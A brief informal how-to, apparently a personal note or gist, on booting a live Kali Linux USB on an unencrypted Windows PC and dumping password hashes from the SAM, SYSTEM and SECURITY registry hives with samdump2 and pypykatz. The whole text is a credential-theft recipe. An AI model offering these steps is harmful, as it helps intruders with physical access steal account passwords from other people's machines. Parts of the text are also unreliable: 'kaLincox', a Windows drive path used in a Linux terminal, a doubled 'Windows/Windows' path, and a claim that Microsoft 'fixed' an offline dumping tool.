If the client PC does not have Bitlocker and Boot or Secure Boot protection;

  1- Plug live kali-linux USB and boot the USB

  2- When opened kaLincox, open terminal and go to "C:\Windows\System32\config" path. Then execute
  
    $ samdump2 SYSTEM SAM

### update; the commands shown above don't work anymore — MSRC fixed them. If you wanna dump the SAM registry, you can use the commands below

  1- cd ../Windows/Windows/System32/config
  2- pypykatz registry --sam SAM --security SECURITY SYSTEM

cheers
